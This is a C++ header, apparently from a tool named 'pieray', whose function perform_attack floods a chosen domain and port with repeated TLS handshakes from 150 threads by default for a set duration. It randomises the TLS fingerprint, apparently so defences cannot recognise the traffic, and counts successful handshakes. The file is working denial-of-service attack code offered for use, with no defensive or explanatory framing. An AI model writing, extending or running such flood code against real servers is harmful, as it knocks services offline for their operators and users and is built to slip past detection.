#pragma once
#include "../core/thread_pool.hpp"
#include "../utils/stats_tracker.hpp"
#include "../utils/tls_fingerprint.hpp"

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <thread>
#include <chrono>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

namespace pieray {

    inline void perform_attack(const std::string& target_domain,
                               int port,
                               int duration,
                               StatsTracker& stats,
                               int threads = 150) {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();

        ThreadPool pool(threads);
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration);

        auto fp = tls::get_random_fingerprint();
        tls::print_fingerprint_debug(fp);

        for (int i = 0; i < threads; ++i) {
            pool.enqueue([=, &stats]() {
                SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
                if (!ctx) return;

                // TLS version setup
                if (fp.tls_version == "TLSv1.2") {
                    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
                    SSL_CTX_set_max_proto_version(ctx, TLS1_2_VERSION);
                } else if (fp.tls_version == "TLSv1.3") {
                    SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
                    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
                }

                // Cipher suite (for TLS 1.2)
                if (fp.tls_version == "TLSv1.2" && !fp.cipher_suites.empty()) {
                    std::string ciphers = "";
                    for (const auto& cs : fp.cipher_suites) {
                        ciphers += cs + ":";
                    }
                    ciphers.pop_back();  // remove trailing :
                    SSL_CTX_set_cipher_list(ctx, ciphers.c_str());
                }

                while (std::chrono::steady_clock::now() < end_time) {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock < 0) {
                        stats.increment_error();
                        continue;
                    }

                    hostent* host = gethostbyname(target_domain.c_str());
                    if (!host) {
                        stats.increment_error();
                        close(sock);
                        continue;
                    }

                    sockaddr_in server_addr{};
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(port);
                    memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);

                    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                        stats.increment_error();
                        close(sock);
                        continue;
                    }

                    SSL* ssl = SSL_new(ctx);
                    SSL_set_fd(ssl, sock);

                    int ret = SSL_connect(ssl);
                    if (ret == 1) {
                        stats.increment_sent();
                        SSL_shutdown(ssl);
                    } else {
                        stats.increment_error();
                    }

                    SSL_free(ssl);
                    close(sock);
                }

                SSL_CTX_free(ctx);
            });
        }
    }

}